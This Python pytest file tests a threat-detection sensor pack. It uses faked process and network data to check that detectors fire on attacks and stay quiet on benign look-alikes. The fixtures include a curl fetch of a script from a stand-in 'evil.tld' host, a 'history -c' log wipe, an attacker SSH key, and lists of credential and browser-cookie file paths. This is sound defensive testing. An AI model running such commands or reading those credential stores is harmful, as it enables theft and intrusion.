#!/usr/bin/env python3
"""
Tests for the v3.9 modern threat sensor pack.

Design rule enforced here: EVERY detector is tested in BOTH directions —
it must fire on the attack behaviour AND stay silent on the benign analogue
that would otherwise generate the obvious false positive. A detector that only
proves it fires is half-tested, and half-tested detectors are how a security
tool ends up hard-blocking production.

psutil is faked rather than mocked ad-hoc so the tests are deterministic and
run identically on any host and in CI.
"""

import os
import sys
import time
import tempfile

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "guest_production_vm"))

import modern_threats as mt  # noqa: E402


# ---------------------------------------------------------------------------
# Fake psutil
# ---------------------------------------------------------------------------

class FakeAddr:
    def __init__(self, ip, port):
        self.ip, self.port = ip, port


class FakeConn:
    def __init__(self, pid, rip, rport, status="ESTABLISHED"):
        self.pid = pid
        self.raddr = FakeAddr(rip, rport) if rip else None
        self.laddr = FakeAddr("10.0.0.5", 44444)
        self.status = status


class FakeFile:
    def __init__(self, path):
        self.path = path


class FakeProc:
    def __init__(self, pid, name, open_files=(), cmdline=(), ppid=0,
                 exe="", user="root", cpu=0.0):
        self.pid = pid
        self._name = name
        self._files = [FakeFile(p) for p in open_files]
        self._cmdline = list(cmdline)
        self._exe = exe or f"/usr/bin/{name}"
        self.info = {"pid": pid, "name": name, "exe": self._exe,
                     "ppid": ppid, "cmdline": self._cmdline, "username": user}
        self._cpu = cpu

    def name(self): return self._name
    def exe(self): return self._exe
    def cmdline(self): return self._cmdline
    def open_files(self): return self._files
    def cpu_percent(self, interval=None): return self._cpu


class NoSuchProcess(Exception): pass
class AccessDenied(Exception): pass


class FakePsutil:
    NoSuchProcess = NoSuchProcess
    AccessDenied = AccessDenied

    def __init__(self, procs=(), conns=()):
        self._procs = list(procs)
        self._conns = list(conns)

    def process_iter(self, attrs=None): return list(self._procs)
    def net_connections(self, kind="inet"): return list(self._conns)
    def Process(self, pid):
        for p in self._procs:
            if p.pid == pid:
                return p
        raise NoSuchProcess(pid)


@pytest.fixture
def collector():
    events = []

    def emit(event_type, severity, details):
        events.append({"event_type": event_type, "severity": severity,
                       "details": details})
    emit.events = events
    emit.types = lambda: [e["event_type"] for e in events]
    return emit


def use_psutil(monkeypatch, procs=(), conns=()):
    monkeypatch.setattr(mt, "psutil", FakePsutil(procs, conns))


# ---------------------------------------------------------------------------
# Cloud metadata / IMDS — T1552.005
# ---------------------------------------------------------------------------

class TestCloudMetadata:
    def test_web_server_reaching_imds_is_critical(self, monkeypatch, collector):
        """The SSRF-to-cloud-credentials signature: nginx must never do this."""
        procs = [FakeProc(100, "nginx", cmdline=["nginx", "-g", "daemon off;"])]
        use_psutil(monkeypatch, procs, [FakeConn(100, "169.254.169.254", 80)])
        found = mt.CloudMetadataDetector(collector).scan()
        assert len(found) == 1
        assert collector.types() == ["imds_access"]
        assert collector.events[0]["severity"] == "critical"
        assert collector.events[0]["details"]["high_risk_process"] is True

    def test_cloud_agent_polling_imds_is_ignored(self, monkeypatch, collector):
        """cloud-init and the SSM agent poll IMDS constantly by design."""
        procs = [FakeProc(1, "cloud-init"), FakeProc(2, "amazon-ssm-agent")]
        use_psutil(monkeypatch, procs, [
            FakeConn(1, "169.254.169.254", 80), FakeConn(2, "169.254.169.254", 80)])
        assert mt.CloudMetadataDetector(collector).scan() == []
        assert collector.events == []

    def test_ecs_task_metadata_endpoint_covered(self, monkeypatch, collector):
        procs = [FakeProc(100, "python3")]
        use_psutil(monkeypatch, procs, [FakeConn(100, "169.254.170.2", 80)])
        assert len(mt.CloudMetadataDetector(collector).scan()) == 1

    def test_normal_outbound_traffic_ignored(self, monkeypatch, collector):
        procs = [FakeProc(100, "nginx")]
        use_psutil(monkeypatch, procs, [FakeConn(100, "142.250.185.78", 443)])
        assert mt.CloudMetadataDetector(collector).scan() == []

    def test_repeat_findings_deduped(self, monkeypatch, collector):
        procs = [FakeProc(100, "nginx")]
        use_psutil(monkeypatch, procs, [FakeConn(100, "169.254.169.254", 80)])
        d = mt.CloudMetadataDetector(collector)
        d.scan(); d.scan(); d.scan()
        assert len(collector.events) == 1


# ---------------------------------------------------------------------------
# Credential access — T1552.001 / T1552.007 / T1555.003
# ---------------------------------------------------------------------------

class TestCredentialAccess:
    def test_unexpected_process_reading_aws_creds_fires(self, monkeypatch, collector):
        procs = [FakeProc(200, "curl", open_files=["/home/deploy/.aws/credentials"])]
        use_psutil(monkeypatch, procs)
        found = mt.CredentialAccessDetector(collector).scan()
        assert len(found) == 1
        assert collector.types() == ["cred_file_access"]
        assert collector.events[0]["details"]["credential_type"] == "aws_credentials"

    def test_aws_cli_reading_own_creds_ignored(self, monkeypatch, collector):
        """The obvious false positive. aws-cli reading ~/.aws/credentials is
        the entire point of the file."""
        procs = [FakeProc(201, "aws", open_files=["/home/deploy/.aws/credentials"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []

    def test_kubectl_reading_kubeconfig_ignored(self, monkeypatch, collector):
        procs = [FakeProc(202, "kubectl", open_files=["/home/ops/.kube/config"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []

    def test_unexpected_process_reading_kubeconfig_fires(self, monkeypatch, collector):
        procs = [FakeProc(203, "nc", open_files=["/home/ops/.kube/config"])]
        use_psutil(monkeypatch, procs)
        assert len(mt.CredentialAccessDetector(collector).scan()) == 1

    def test_k8s_service_account_token_theft_fires(self, monkeypatch, collector):
        procs = [FakeProc(204, "bash", open_files=[
            "/var/run/secrets/kubernetes.io/serviceaccount/token"])]
        use_psutil(monkeypatch, procs)
        mt.CredentialAccessDetector(collector).scan()
        assert collector.types() == ["k8s_token_access"]

    def test_kubelet_reading_sa_token_ignored(self, monkeypatch, collector):
        procs = [FakeProc(205, "kubelet", open_files=[
            "/var/run/secrets/kubernetes.io/serviceaccount/token"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []

    def test_versioned_process_name_allowlisted(self, monkeypatch, collector):
        """python3.11 must match the 'python3' allowlist entry."""
        procs = [FakeProc(206, "python3.11", open_files=["/root/.aws/credentials"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []

    def test_ssh_private_key_read_by_stealer_fires(self, monkeypatch, collector):
        procs = [FakeProc(207, "xmrig", open_files=["/root/.ssh/id_rsa"])]
        use_psutil(monkeypatch, procs)
        mt.CredentialAccessDetector(collector).scan()
        assert collector.types() == ["cred_file_access"]


class TestBrowserCredentialTheft:
    def test_infostealer_reading_login_data_fires(self, monkeypatch, collector):
        procs = [FakeProc(300, "stealer.exe", open_files=[
            "/home/u/.config/google-chrome/Default/Login Data"])]
        use_psutil(monkeypatch, procs)
        mt.CredentialAccessDetector(collector).scan()
        assert collector.types() == ["browser_cred_theft"]
        assert collector.events[0]["severity"] == "critical"

    def test_cookie_store_theft_fires(self, monkeypatch, collector):
        """Session-cookie theft is what makes MFA irrelevant."""
        procs = [FakeProc(301, "rundll32", open_files=[
            "/home/u/.mozilla/firefox/abc.default/cookies.sqlite"])]
        use_psutil(monkeypatch, procs)
        mt.CredentialAccessDetector(collector).scan()
        assert collector.types() == ["browser_cred_theft"]

    def test_chrome_reading_its_own_store_ignored(self, monkeypatch, collector):
        procs = [FakeProc(302, "chrome", open_files=[
            "/home/u/.config/google-chrome/Default/Login Data"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []

    def test_backup_agent_reading_profile_ignored(self, monkeypatch, collector):
        """A backup tool walking the home directory must not look like a stealer."""
        procs = [FakeProc(303, "restic", open_files=[
            "/home/u/.config/google-chrome/Default/Cookies"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []

    @pytest.mark.parametrize("path,expected", [
        ("/home/u/.mozilla/firefox/ab.default/cookies.sqlite", True),
        ("/home/u/.config/google-chrome/Default/Login Data", True),
        ("/home/u/.config/chromium/Default/Login Data", True),
        ("/Users/u/Library/Application Support/Google/Chrome/Default/Cookies", True),
        ("C:\\Users\\a\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", True),
        ("C:\\Users\\a\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\x\\key4.db", True),
        ("/home/u/.config/google-chrome/Default/Preferences", False),
        ("/var/log/syslog", False),
    ])
    def test_browser_artifact_paths_cross_platform(self, path, expected):
        """Regression: an earlier marker list required a leading slash before
        the vendor name, so ~/.mozilla/firefox never matched; and basename()
        on Linux does not split Windows paths, so every Windows profile path
        failed. Both would have blinded the detector to real infostealers."""
        assert mt.CredentialAccessDetector._is_browser_artifact(path.lower()) is expected

    def test_unrelated_file_in_profile_dir_ignored(self, monkeypatch, collector):
        procs = [FakeProc(304, "grep", open_files=[
            "/home/u/.config/google-chrome/Default/Preferences"])]
        use_psutil(monkeypatch, procs)
        assert mt.CredentialAccessDetector(collector).scan() == []


# ---------------------------------------------------------------------------
# Container escape — T1611
# ---------------------------------------------------------------------------

class TestContainerEscape:
    def test_shell_holding_docker_socket_fires(self, monkeypatch, collector):
        procs = [FakeProc(400, "bash", open_files=["/var/run/docker.sock"])]
        use_psutil(monkeypatch, procs)
        mt.ContainerEscapeDetector(collector).scan()
        assert collector.types() == ["container_escape"]
        assert collector.events[0]["details"]["socket"] == "docker_socket"

    def test_docker_daemon_holding_own_socket_ignored(self, monkeypatch, collector):
        procs = [FakeProc(401, "dockerd", open_files=["/var/run/docker.sock"])]
        use_psutil(monkeypatch, procs)
        assert mt.ContainerEscapeDetector(collector).scan() == []

    def test_kubelet_containerd_socket_ignored(self, monkeypatch, collector):
        procs = [FakeProc(402, "kubelet",
                          open_files=["/run/containerd/containerd.sock"])]
        use_psutil(monkeypatch, procs)
        assert mt.ContainerEscapeDetector(collector).scan() == []

    def test_host_filesystem_reachthrough_fires(self, monkeypatch, collector):
        procs = [FakeProc(403, "python3", open_files=["/host/etc/shadow"])]
        use_psutil(monkeypatch, procs)
        mt.ContainerEscapeDetector(collector).scan()
        assert collector.types() == ["container_escape"]
        assert collector.events[0]["details"]["reason"] == "host_filesystem_reachthrough"

    def test_core_pattern_escape_fires(self, monkeypatch, collector):
        procs = [FakeProc(404, "sh",
                          open_files=["/proc/sys/kernel/core_pattern"])]
        use_psutil(monkeypatch, procs)
        assert len(mt.ContainerEscapeDetector(collector).scan()) == 1

    def test_ordinary_file_access_ignored(self, monkeypatch, collector):
        procs = [FakeProc(405, "bash", open_files=["/etc/hosts", "/tmp/x"])]
        use_psutil(monkeypatch, procs)
        assert mt.ContainerEscapeDetector(collector).scan() == []


# ---------------------------------------------------------------------------
# Supply chain — T1195.002
# ---------------------------------------------------------------------------

class TestSupplyChain:
    def test_npm_spawning_curl_fires(self, monkeypatch, collector):
        procs = [FakeProc(500, "npm"),
                 FakeProc(501, "curl", ppid=500,
                          cmdline=["curl", "http://evil.tld/p.sh"])]
        use_psutil(monkeypatch, procs)
        mt.SupplyChainDetector(collector).scan()
        assert collector.types() == ["supply_chain"]
        assert collector.events[0]["details"]["package_manager"] == "npm"

    def test_pip_spawning_bash_fires(self, monkeypatch, collector):
        procs = [FakeProc(502, "pip3"), FakeProc(503, "bash", ppid=502)]
        use_psutil(monkeypatch, procs)
        assert len(mt.SupplyChainDetector(collector).scan()) == 1

    def test_npm_native_build_ignored(self, monkeypatch, collector):
        """node-gyp builds spawn compilers constantly — must not fire."""
        procs = [FakeProc(504, "npm"),
                 FakeProc(505, "node-gyp", ppid=504),
                 FakeProc(506, "make", ppid=504),
                 FakeProc(507, "gcc", ppid=504)]
        use_psutil(monkeypatch, procs)
        assert mt.SupplyChainDetector(collector).scan() == []

    def test_unrelated_shell_ignored(self, monkeypatch, collector):
        procs = [FakeProc(508, "sshd"), FakeProc(509, "bash", ppid=508)]
        use_psutil(monkeypatch, procs)
        assert mt.SupplyChainDetector(collector).scan() == []


# ---------------------------------------------------------------------------
# Web-service C2 and tunnels — T1102.002 / T1572
# ---------------------------------------------------------------------------

class TestWebServiceC2:
    def test_non_browser_to_telegram_fires(self, monkeypatch, collector):
        procs = [FakeProc(600, "svchost")]
        use_psutil(monkeypatch, procs, [FakeConn(600, "149.154.167.220", 443)])
        d = mt.WebServiceC2Detector(collector, resolver=lambda ip: "api.telegram.org")
        d.scan()
        assert collector.types() == ["web_service_c2"]
        assert collector.events[0]["details"]["service"] == "telegram"

    def test_browser_to_discord_ignored(self, monkeypatch, collector):
        procs = [FakeProc(601, "chrome")]
        use_psutil(monkeypatch, procs, [FakeConn(601, "162.159.128.233", 443)])
        d = mt.WebServiceC2Detector(collector, resolver=lambda ip: "discord.com")
        assert d.scan() == []

    def test_git_to_github_ignored(self, monkeypatch, collector):
        procs = [FakeProc(602, "git")]
        use_psutil(monkeypatch, procs, [FakeConn(602, "140.82.121.4", 443)])
        d = mt.WebServiceC2Detector(collector, resolver=lambda ip: "api.github.com")
        assert d.scan() == []

    def test_unresolvable_destination_ignored(self, monkeypatch, collector):
        procs = [FakeProc(603, "svchost")]
        use_psutil(monkeypatch, procs, [FakeConn(603, "1.2.3.4", 443)])
        d = mt.WebServiceC2Detector(collector, resolver=lambda ip: "")
        assert d.scan() == []

    def test_confidence_is_labelled_supporting(self, monkeypatch, collector):
        """rDNS-based detection is defeatable; the event must say so."""
        procs = [FakeProc(604, "malware")]
        use_psutil(monkeypatch, procs, [FakeConn(604, "1.1.1.1", 443)])
        d = mt.WebServiceC2Detector(collector, resolver=lambda ip: "pastebin.com")
        d.scan()
        assert collector.events[0]["details"]["detection_confidence"] == "supporting"


class TestTunnel:
    def test_ngrok_fires_high(self, monkeypatch, collector):
        procs = [FakeProc(700, "ngrok", cmdline=["ngrok", "tcp", "22"])]
        use_psutil(monkeypatch, procs)
        mt.TunnelDetector(collector).scan()
        assert collector.types() == ["tunnel"]
        assert collector.events[0]["severity"] == "high"

    def test_cloudflared_flagged_but_downgraded(self, monkeypatch, collector):
        """Often sanctioned infrastructure — report it, don't scream."""
        procs = [FakeProc(701, "cloudflared")]
        use_psutil(monkeypatch, procs)
        mt.TunnelDetector(collector).scan()
        assert collector.events[0]["severity"] == "medium"
        assert collector.events[0]["details"]["commonly_sanctioned"] is True

    def test_ordinary_process_ignored(self, monkeypatch, collector):
        use_psutil(monkeypatch, [FakeProc(702, "nginx")])
        assert mt.TunnelDetector(collector).scan() == []


# ---------------------------------------------------------------------------
# Cryptomining — T1496
# ---------------------------------------------------------------------------

class TestCryptominer:
    def test_known_miner_binary_fires(self, monkeypatch, collector):
        use_psutil(monkeypatch, [FakeProc(800, "xmrig", cpu=99.0)])
        mt.CryptominerDetector(collector).scan()
        assert collector.types() == ["cryptominer"]
        assert "known_miner_binary" in collector.events[0]["details"]["evidence"]

    def test_renamed_miner_caught_by_pool_port(self, monkeypatch, collector):
        """Renaming the binary must not evade — the pool connection is the tell."""
        procs = [FakeProc(801, "systemd-worker", cpu=98.0)]
        use_psutil(monkeypatch, procs, [FakeConn(801, "45.9.148.2", 3333)])
        d = mt.CryptominerDetector(collector, sustained_samples=1)
        d.scan()
        assert collector.types() == ["cryptominer"]
        ev = collector.events[0]["details"]["evidence"]
        assert any("mining_pool_port" in e for e in ev)

    def test_build_server_high_cpu_alone_ignored(self, monkeypatch, collector):
        """Sustained 100% CPU is a compiler, not evidence of mining."""
        procs = [FakeProc(802, "gcc", cpu=100.0)]
        use_psutil(monkeypatch, procs)
        d = mt.CryptominerDetector(collector, sustained_samples=1)
        d.scan(); d.scan(); d.scan()
        assert collector.events == []

    def test_pool_keyword_needs_corroboration(self, monkeypatch, collector):
        procs = [FakeProc(803, "worker", cmdline=["worker", "--pool", "x"], cpu=5.0)]
        use_psutil(monkeypatch, procs)
        d = mt.CryptominerDetector(collector, sustained_samples=2)
        d.scan()
        assert collector.events == []


# ---------------------------------------------------------------------------
# Data destruction — T1485
# ---------------------------------------------------------------------------

class TestDataDestruction:
    def test_mass_deletion_fires(self, collector):
        d = mt.DataDestructionDetector(collector, min_deletions=100)
        d.record_deletions([f"/data/f{i}" for i in range(150)])
        assert d.evaluate() is not None
        assert collector.types() == ["data_destruction"]
        assert collector.events[0]["details"]["deleted_count"] == 150

    def test_small_cleanup_ignored(self, collector):
        d = mt.DataDestructionDetector(collector, min_deletions=100)
        d.record_deletions([f"/tmp/f{i}" for i in range(20)])
        assert d.evaluate() is None

    def test_window_expiry(self, collector):
        d = mt.DataDestructionDetector(collector, window=1, min_deletions=10)
        d.record_deletions([f"/d/{i}" for i in range(50)])
        time.sleep(1.1)
        assert d.evaluate() is None


# ---------------------------------------------------------------------------
# Log tampering — T1070.002 / T1070.003
# ---------------------------------------------------------------------------

class TestLogTamper:
    def test_log_truncation_detected(self, monkeypatch, collector):
        with tempfile.TemporaryDirectory() as tmp:
            log = os.path.join(tmp, "auth.log")
            with open(log, "w") as fh:
                fh.write("x" * 100_000)
            monkeypatch.setattr(mt, "SENSITIVE_LOGS", (log,))
            d = mt.LogTamperDetector(collector)
            d.check_filesystem()                 # baseline
            assert collector.events == []
            with open(log, "w") as fh:           # attacker truncates
                fh.write("")
            d.check_filesystem()
            assert collector.types() == ["log_tamper"]
            assert collector.events[0]["details"]["reason"] == "log_truncation"

    def test_log_growth_ignored(self, monkeypatch, collector):
        with tempfile.TemporaryDirectory() as tmp:
            log = os.path.join(tmp, "syslog")
            with open(log, "w") as fh:
                fh.write("x" * 10_000)
            monkeypatch.setattr(mt, "SENSITIVE_LOGS", (log,))
            d = mt.LogTamperDetector(collector)
            d.check_filesystem()
            with open(log, "a") as fh:
                fh.write("y" * 10_000)
            d.check_filesystem()
            assert collector.events == []

    def test_history_clear_command_detected(self, monkeypatch, collector):
        procs = [FakeProc(900, "bash", cmdline=["history", "-c"])]
        use_psutil(monkeypatch, procs)
        mt.LogTamperDetector(collector).check_processes()
        assert collector.types() == ["log_tamper"]

    def test_normal_command_ignored(self, monkeypatch, collector):
        procs = [FakeProc(901, "bash", cmdline=["tail", "-f", "/var/log/syslog"])]
        use_psutil(monkeypatch, procs)
        assert mt.LogTamperDetector(collector).check_processes() == []


# ---------------------------------------------------------------------------
# Reverse shell — T1059.004
# ---------------------------------------------------------------------------

class TestReverseShell:
    @staticmethod
    def _fake_proc_fs(tmp, pid, targets):
        fd_dir = os.path.join(tmp, str(pid), "fd")
        os.makedirs(fd_dir, exist_ok=True)
        for fd, target in targets.items():
            link = os.path.join(fd_dir, str(fd))
            if not os.path.exists(link):
                os.symlink(target, link)

    def test_shell_with_stdio_on_socket_fires(self, monkeypatch, collector):
        with tempfile.TemporaryDirectory() as tmp:
            self._fake_proc_fs(tmp, 1000, {0: "socket:[12345]",
                                           1: "socket:[12345]",
                                           2: "socket:[12345]"})
            use_psutil(monkeypatch, [FakeProc(1000, "bash", cmdline=["bash", "-i"])])
            d = mt.ReverseShellDetector(collector, proc_root=tmp)
            d.scan()
            assert collector.types() == ["reverse_shell"]
            assert collector.events[0]["details"]["socket_bound_fds"] == ["fd0", "fd1", "fd2"]

    def test_normal_shell_on_tty_ignored(self, monkeypatch, collector):
        with tempfile.TemporaryDirectory() as tmp:
            self._fake_proc_fs(tmp, 1001, {0: "/dev/pts/0", 1: "/dev/pts/0",
                                           2: "/dev/pts/0"})
            use_psutil(monkeypatch, [FakeProc(1001, "bash")])
            d = mt.ReverseShellDetector(collector, proc_root=tmp)
            assert d.scan() == []

    def test_piped_shell_single_socket_fd_ignored(self, monkeypatch, collector):
        """One redirected fd is an ordinary pipeline, not a reverse shell."""
        with tempfile.TemporaryDirectory() as tmp:
            self._fake_proc_fs(tmp, 1002, {0: "/dev/pts/1", 1: "socket:[999]",
                                           2: "/dev/pts/1"})
            use_psutil(monkeypatch, [FakeProc(1002, "bash")])
            d = mt.ReverseShellDetector(collector, proc_root=tmp)
            assert d.scan() == []

    def test_non_shell_process_ignored(self, monkeypatch, collector):
        with tempfile.TemporaryDirectory() as tmp:
            self._fake_proc_fs(tmp, 1003, {0: "socket:[1]", 1: "socket:[1]",
                                           2: "socket:[1]"})
            use_psutil(monkeypatch, [FakeProc(1003, "nginx")])
            d = mt.ReverseShellDetector(collector, proc_root=tmp)
            assert d.scan() == []


# ---------------------------------------------------------------------------
# SSH persistence — T1098.004
# ---------------------------------------------------------------------------

class TestSSHPersistence:
    def test_added_key_fires(self, collector):
        with tempfile.TemporaryDirectory() as tmp:
            ak = os.path.join(tmp, "authorized_keys")
            with open(ak, "w") as fh:
                fh.write("ssh-rsa AAAAB3NzaC1legit user@corp\n")
            d = mt.SSHPersistenceDetector(collector, key_paths=[ak])
            d.scan()                              # baseline
            assert collector.events == []
            with open(ak, "a") as fh:             # attacker appends
                fh.write("ssh-ed25519 AAAAC3NzaC1lattacker evil@vps\n")
            d.scan()
            assert collector.types() == ["ssh_persistence"]
            assert collector.events[0]["details"]["keys_added"] == 1

    def test_unchanged_file_silent(self, collector):
        with tempfile.TemporaryDirectory() as tmp:
            ak = os.path.join(tmp, "authorized_keys")
            with open(ak, "w") as fh:
                fh.write("ssh-rsa AAAAB3Nza user@corp\n")
            d = mt.SSHPersistenceDetector(collector, key_paths=[ak])
            d.scan(); d.scan(); d.scan()
            assert collector.events == []

    def test_first_sight_is_baseline_not_alert(self, collector):
        """Discovering existing keys on startup must not alert."""
        with tempfile.TemporaryDirectory() as tmp:
            ak = os.path.join(tmp, "authorized_keys")
            with open(ak, "w") as fh:
                fh.write("ssh-rsa AAAA a@b\nssh-rsa BBBB c@d\n")
            d = mt.SSHPersistenceDetector(collector, key_paths=[ak])
            d.scan()
            assert collector.events == []

    def test_missing_file_handled(self, collector):
        d = mt.SSHPersistenceDetector(collector, key_paths=["/nonexistent/authorized_keys"])
        assert d.scan() == []


# ---------------------------------------------------------------------------
# Suite integration + control-plane wiring
# ---------------------------------------------------------------------------

class TestSuiteAndWiring:
    def test_suite_runs_all_without_psutil(self, monkeypatch, collector):
        """No psutil must degrade to zero findings, never an exception."""
        monkeypatch.setattr(mt, "psutil", None)
        suite = mt.ModernThreatSuite(collector)
        results = suite.scan_all()
        assert results and all(v >= 0 for v in results.values())

    def test_one_failing_sensor_does_not_stop_others(self, monkeypatch, collector):
        suite = mt.ModernThreatSuite(collector)

        class Boom:
            def scan(self): raise RuntimeError("sensor exploded")
        suite.imds = Boom()
        results = suite.scan_all()
        assert results["imds"] == -1          # error surfaced, not hidden
        assert results["credentials"] >= 0    # others still ran

    def test_all_modern_event_types_scored(self):
        sys.path.insert(0, os.path.join(ROOT, "host_control_plane"))
        import control_center
        for et in ("imds_access", "cred_file_access", "k8s_token_access",
                   "browser_cred_theft", "container_escape", "supply_chain",
                   "web_service_c2", "tunnel", "cryptominer",
                   "data_destruction", "log_tamper", "reverse_shell",
                   "ssh_persistence"):
            assert control_center.SCORE_WEIGHTS.get(et, 0) > 0, f"{et} unscored"

    def test_all_modern_event_types_mapped_to_attack(self):
        from common.mitre_attack import map_event_to_techniques
        for et in ("imds_access", "cred_file_access", "k8s_token_access",
                   "browser_cred_theft", "container_escape", "supply_chain",
                   "web_service_c2", "tunnel", "cryptominer",
                   "data_destruction", "log_tamper", "reverse_shell",
                   "ssh_persistence"):
            assert map_event_to_techniques(et, {}), f"{et} has no ATT&CK mapping"

    def test_all_modern_event_types_have_sigma_rule(self):
        from blue_team.sigma_engine.sigma_engine import SigmaEngine
        eng = SigmaEngine()
        eng.load_dir()
        for et in ("imds_access", "cred_file_access", "k8s_token_access",
                   "browser_cred_theft", "container_escape", "supply_chain",
                   "web_service_c2", "tunnel", "cryptominer",
                   "data_destruction", "log_tamper", "reverse_shell",
                   "ssh_persistence"):
            assert eng.evaluate({"event_type": et, "details": {}}), \
                f"{et} matches no Sigma rule"
